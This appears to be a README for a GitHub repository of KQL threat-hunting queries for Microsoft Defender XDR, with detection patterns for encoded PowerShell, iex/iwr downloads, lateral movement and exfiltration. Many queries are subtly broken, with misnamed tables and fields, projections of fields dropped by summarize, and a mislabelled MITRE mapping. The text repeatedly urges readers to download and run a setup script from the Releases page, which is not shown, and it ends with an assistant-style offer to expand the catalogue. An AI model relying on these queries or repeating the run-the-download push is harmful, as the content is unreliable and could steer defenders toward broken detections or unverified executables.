# KQL Queries for Defender XDR Threat Hunting and Detection

[![Release Artifacts](https://img.shields.io/badge/Release-View%20Artifacts-brightgreen)](https://github.com/jaraguayo/KQL-Queries/releases)

[Microsoft Defender XDR threat hunting KQL queries](https://github.com/jaraguayo/KQL-Queries/releases)

A curated set of KQL queries designed for Microsoft Defender XDR threat hunting and detection. This collection helps incident response teams, security operations centers, and threat hunters quickly surface suspicious activity, map findings to MITRE ATT&CK techniques, and accelerate investigations across Defender XDR data sources.

![Microsoft Defender Logo](https://upload.wikimedia.org/wikipedia/commons/4/48/Microsoft_Defender_Logo.png)

Table of contents
- Overview
- Why this project exists
- How to get started
- Quickstart: run your first query
- Data sources and schema
- Query catalog
  - Threat hunting queries
  - Threat detection queries
  - MITRE ATT&CK mappings
  - Persistence and isolation indicators
  - Suspicious process and PowerShell activity
  - Lateral movement and network indicators
  - Account abuse and sign-in anomalies
  - Exfiltration and data loss indicators
  - Endpoint and device posture signals
- Best practices for writing KQL queries
- Workflows and usage patterns
- Data governance and safety considerations
- How this repository is organized
- How to contribute
- Release notes and assets
- FAQ
- License
- Acknowledgments

Overview
This repository contains a wide range of KQL queries crafted to assist Defender XDR threat hunting and rapid detection workflows. The queries cover common attack patterns, credential abuse, lateral movement, persistence techniques, and data exfiltration signals. They are designed to be drop-in examples you can adapt to your own workspace, dashboards, and alerting rules.

Why this project exists
Security teams face a large and evolving threat landscape. Defender XDR consolidates signals from endpoints, identities, clouds, and apps. However, raw data is only part of the solution. You need targeted queries that translate data into actionable signals. This project provides ready-to-use KQL snippets plus guidance on how to tailor them to your environment. It helps you:
- Accelerate threat hunting with reusable queries.
- Align detections with MITRE ATT&CK techniques.
- Improve investigation efficiency through clear projections and fields.
- Share knowledge across teams and environments.

How to get started
To begin, you should have access to a Defender XDR-enabled environment with data flowing into an Azure Monitor Logs workspace or Microsoft Sentinel. You will run KQL against the workspace that ingests Defender XDR data, such as Defender for Endpoint, Defender for Identity, and related signals. The queries in this repository assume you have at least read access to the relevant data tables and that you know how to navigate the query editor.

Prerequisites
- An Azure Monitor Logs workspace or Microsoft Sentinel workspace with Defender XDR data streams connected.
- Basic familiarity with Kusto Query Language (KQL).
- A current Defender XDR deployment, including Defender for Endpoint signals and related telemetry.
- Optional: a role with the right permissions to create, save, and share queries or to pin them to dashboards and workbooks.
- Optional: a knowledge of MITRE ATT&CK techniques to map results to a common framework.

Quickstart: run your first query
1) Open your workspace in the Azure portal or Microsoft Sentinel.
2) Go to the Logs (Analytics) pane to access the query editor.
3) Copy one of the simplest queries below to verify data access.
4) Run the query and review the results.
5) Save the query to a library or pin it to a workbook or dashboard for ongoing visibility.

Sample quickstart query
This is a compact starter that surfaces power-user activity on endpoints, often a precursor to more complex hunt queries.

```kql
// Quick start: find PowerShell-like activity in the last 6 hours
DeviceEvents
| where Timestamp > ago(6h)
| where ActionType == "ProcessCreated"
| where InitiatingProcessFileName has_any ("powershell.exe","pwsh.exe","pwsh","powershell")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessFileName, ProcessCommandLine
| sort by Timestamp desc
```

If you want to verify a broader signal that may indicate compromised credentials, you can run a login anomaly query.

```kql
// Quick start: detect unusual sign-in events by user count in a short window
SigninLogs
| where TimeGenerated > ago(6h)
| summarize UniqueUsers = dcount(UserPrincipalName), SignInCount = count() by bin(TimeGenerated, 1h)
| where UniqueUsers > 5
| project TimeGenerated, UniqueUsers, SignInCount, UserPrincipalName
```

Data sources and schema
Defender XDR data comes from multiple sources. This repository focuses on commonly used data marts and tables that Defender XDR surfaces in the workspace. Key tables you’ll encounter include:
- DeviceEvents: telemetry about device-side activities, such as process creation, file operations, and registry events.
- DefenderAlerts: alerts generated by Defender solutions, including detections with policy-driven severity.
- NetworkEvents: network-related telemetry, including connections, SMB activity, and DNS lookups.
- SigninLogs: sign-in events for user accounts across cloud services.
- DeviceLogonEvents: authentication and session events on endpoints.
- FileEvents: file-level events, including creation, modification, or execution signals.
- ProcessEvents: detailed process telemetry, often used for lineage analysis.

Projecting fields in queries is essential for clarity. Common fields you’ll see across queries include:
- Timestamp or TimeGenerated: the moment the event occurred.
- DeviceName or Computer: the endpoint involved.
- InitiatingProcessFileName and InitiatingProcessCommandLine: the process that started an action.
- ProcessFileName and ProcessCommandLine: the resulting process that performed an action.
- UserPrincipalName: the user associated with the event.
- ReportId or EventSource: unique identifiers for tracing.

Query catalog
Threat hunting queries
- Goal: surface suspicious process creation, PowerShell usage, or script-based activity that could indicate an adversary foothold.
- Example: detect suspicious PowerShell usage with encoded commands.
```kql
DeviceEvents
| where Timestamp > ago(24h)
| where ActionType == "ProcessCreated"
| where InitiatingProcessFileName has_any ("powershell.exe","pwsh.exe","pwsh","powershell")
| where InitiatingProcessCommandLine has_any ("-enc","-EncodedCommand","Invoke-Expression","Base64")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp desc
```

- Example: detect unexpected PowerShell activity on a server.
```kql
DeviceEvents
| where Timestamp > ago(12h)
| where ActionType == "ProcessCreated"
| where InitiatingProcessParentName == "svchost.exe"
| where InitiatingProcessFileName in ("powershell.exe","pwsh.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiativeProcessCommandLine
```

- Example: suspicious script downloads in a short window.
```kql
DeviceFileEvents
| where Timestamp > ago(6h)
| where ActionType == "FileCreated" and FileName endswith ".ps1"
| join kind=inner (
    DeviceEvents
    | where Timestamp > ago(6h)
    | where ActionType == "ProcessCreated"
    | project DeviceId, UserId, Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine
) on DeviceId
| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp desc
```

Threat detection queries
- Goal: provide detections that trigger alerts when a pattern matches a known malicious behavior.
- Example: detect suspicious network connections to uncommon external destinations.
```kql
NetworkEvents
| where TimeGenerated > ago(24h)
| where RemoteIPCountry != "CN" and RemoteIPCountry != "RU" // example
| summarize Count = count() by RemoteIPCountry, RemoteIP, Protocol
| where Count > 5
| project TimeGenerated, RemoteIP, RemoteIPCountry, Protocol, Count
```

- Example: identify abnormal credential use across cloud apps.
```kql
SigninLogs
| where TimeGenerated > ago(1d)
| summarize Attempts = count() by UserPrincipalName, AppDisplayName, ResultDescription
| where Attempts > 3 and ResultDescription != "Success"
| project TimeGenerated, UserPrincipalName, AppDisplayName, ResultDescription, Attempts
```

MITRE ATT&CK mappings
- Goal: map detections to MITRE ATT&CK techniques to improve reporting and collaboration.
- Example: map brute force attempts to T1110 (Brute Force) and anomalous sign-ins to T1078 (Valid Accounts).
```kql
SigninLogs
| where TimeGenerated > ago(2d)
| summarize Attempts = count() by UserPrincipalName, AuthenticationRequirement, ResultStatus = ResultDescription
| where Attempts > 5
| extend MITRE_Technique = case(ResultDescription == "Failure" and AuthenticationRequirement == "Password", "TA0006 - Credential Access: Brute Force", "TA0009 - Valid Accounts")
| project TimeGenerated, UserPrincipalName, MITRE_Technique, Attempts
```

Persistence and isolation indicators
- Goal: surface starting points for persistence or suspicious changes to device state.
- Example: detect unusual startup items or services created by non-system processes.
```kql
DeviceEvents
| where Timestamp > ago(7d)
| where ActionType == "StartupItemCreated" or ActionType == "ServiceCreated"
| where InitiatingProcessFileName !in ("services.exe","svchost.exe","winlogon.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, CommandLine
```

Suspicious process and PowerShell activity
- Goal: isolate suspicious process chains that may indicate a malware attempt.
```kql
DeviceEvents
| where Timestamp > ago(8h)
| where ActionType == "ProcessCreated"
| where InitiatingProcessFileName has_any ("powershell.exe","pwsh.exe","cmd.exe")
| mv-expand CommandLine = split(InitiatingProcessCommandLine, " ")
| where CommandLine matches regex @".*(iex|iwr|download|invoke|encrypted|Base64).*"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
```

Lateral movement and network indicators
- Goal: identify attempts to move laterally across the network.
```kql
NetworkEvents
| where TimeGenerated > ago(1d)
| where Protocol in ("SMB","SMB2","RDP","WMI")
| where ActionType in ("ConnectionEstablished","ConnectionAttempt")
| where RemotePort in (445, 3389)
| project TimeGenerated, DeviceName, SourceIP, DestinationIP, DestinationPort, Protocol, ActionType
```

Account abuse and sign-in anomalies
- Goal: highlight anomalies in sign-in patterns that may reflect compromised accounts.
```kql
SigninLogs
| where TimeGenerated > ago(2d)
| summarize SignInCount = count() by UserPrincipalName, ClientAppUsed, IPAddress, ResultDescription
| where SignInCount > 10 and ResultDescription != "Success"
| project TimeGenerated, UserPrincipalName, IPAddress, ClientAppUsed, SignInCount, ResultDescription
```

Exfiltration and data loss indicators
- Goal: catch data movement events that look suspicious.
```kql
DeviceEvents
| where ActionType == "DataExfiltrated"
| where FileName != ""
| where DestinationAddress != "" 
| project TimeGenerated, DeviceName, FileName, DestinationAddress, DestinationPort, ExfiltrationMethod
```

Endpoint and device posture signals
- Goal: monitor the health and compliance posture of devices.
```kql
DevicePostureEvents
| where TimeGenerated > ago(1d)
| where PostureState in ("Unhealthy","NeedsAttention")
| summarize Count = count() by DeviceName, PostureState
| sort by Count desc
```

Better practices for using KQL with Defender XDR
- Use explicit time windows. Always specify a trailing time window for performance and consistency.
- Project only necessary fields. This reduces data transfer and makes results easier to read.
- Use summarize and by clauses to detect trends and anomalies over time.
- Combine signals with joins only when needed. Joins can be powerful but expensive.
- Map results to MITRE ATT&CK techniques to align with incident response playbooks.
- Save reusable queries to a library or compartable dashboards for team sharing.
- Use parameterized queries where possible to reuse and avoid duplicating logic.

MITRE ATT&CK mappings in practice
- Tactic-first approach: List the technique category first, then the specific sub-technique if applicable.
- Example: Anomaly-based detection of credential abuse maps to T1078 (Valid Accounts) or T1110 (Brute Force), depending on context.
- Use a consistent naming convention for the technique within your queries, so dashboards and reports can reliably group results.

Data governance and safety considerations
- Ensure compliant access to sensitive data. Only grant read permissions to the people who need it.
- Mask or redact sensitive fields in shared artifacts when distributing broadly.
- Keep queries up to date as your Defender data model evolves. Defender XDR data schemas can change with updates to the product.
- Use caution with exports. Large exports can incur costs and affect performance in shared workspaces.

How this repository is organized
- /queries: A collection of KQL snippets organized by theme (threat hunting, detection, MITRE mapping, etc.).
- /templates: Templates for common dashboards and workbooks that visualize query results.
- /docs: Additional explanations, glossaries, and usage notes.
- /examples: Use-case driven examples showing end-to-end hunts and investigations.
- /contrib: Guidelines for contributors and pull request templates.

How to contribute
- Follow the project’s contribution guidelines to add new queries, improve existing ones, or propose enhancements.
- Before contributing, run the existing tests or validations to ensure your snippet behaves as expected in typical Defender XDR environments.
- Use clear, concise naming for new queries and include a short description, data sources, and intended MITRE ATT&CK mapping.
- Provide sample outputs or screenshots when possible to illustrate what results should look like.
- Include a minimum of one practical use case per new query and explain how to validate the results in a real environment.

Release notes and assets
- The repository uses a Releases page to provide downloadable assets. The assets include packaged query libraries and example dashboards, ready to import into Defender XDR or Sentinel workspaces.
- If you are exploring this repository for the first time, visit the Releases page to see the latest package. The page hosts artifacts that you can download and execute in your environment.
- Important note: The Releases page includes files that you can download and run. To obtain the artifacts, visit the Releases page at https://github.com/jaraguayo/KQL-Queries/releases and download the latest release asset. After downloading, extract the package and run the included setup script or import the contained queries into your workspace. The link is also provided here for quick access: https://github.com/jaraguayo/KQL-Queries/releases

FAQ
- Q: Are these queries safe to run in production?
  A: Yes, but run them with read access and in a test or staging environment if possible. Start with a small time window and verify results before broadening scope.
- Q: Do these queries work with all Defender XDR data sources?
  A: They target common Defender XDR telemetry. Some data sources may require adaptation to your environment or data model.
- Q: How do I contribute a new query?
  A: Fork the repository, add your query with a clear name and description, and submit a pull request. Include the data sources and MITRE mapping in the description.

Tips for testing and validating queries
- Start with a narrow time window and a small scope to verify the expected fields and results.
- Validate field names against your workspace schema. If a field is missing, adapt the query to your environment.
- Use the visualize and summarize features to confirm that the data supports the intended pattern.
- Compare results across multiple days to confirm consistency and catch anomalies.

License
- This repository is provided under the MIT license. Feel free to reuse, modify, and distribute the queries in your Defender XDR environments, with proper attribution.

Changelog
- A changelog is maintained in the Releases and Docs sections. Each release includes a summary of added queries, updated mappings, and any breaking changes.

Acknowledgments
- Thanks to the Defender XDR community for feedback and use cases. Collaboration helps improve detection quality and reduces noise across hunting workflows.

Important note about the Releases link
- The Releases page is the primary distribution channel for the packaged assets described above. If you need the downloadable artifacts, you should go to the Releases page and download the latest release. The link is provided again here for convenience: https://github.com/jaraguayo/KQL-Queries/releases

For more information
- If you want to explore more, visit the top-level repository page, which links to the releases and other resources. The same link is used again here: https://github.com/jaraguayo/KQL-Queries/releases

Visual references and resources
- Defender branding and telemetry are used to illustrate the kinds of signals covered by these queries.
- Logos and icons come from open sources for educational purposes and are used to help users recognize Defender XDR themes in the README and documentation.

Topics
- azure
- defender
- defenderxdr
- kql
- microsoft
- mitre-attack
- sentinel
- threat
- threat-detection
- threat-hunting
- threat-intelligence
- threathunting

If you need additional sections or want me to tailor any queries to a specific Defender XDR data source or workspace, I can expand the catalog with more precise examples and guidance.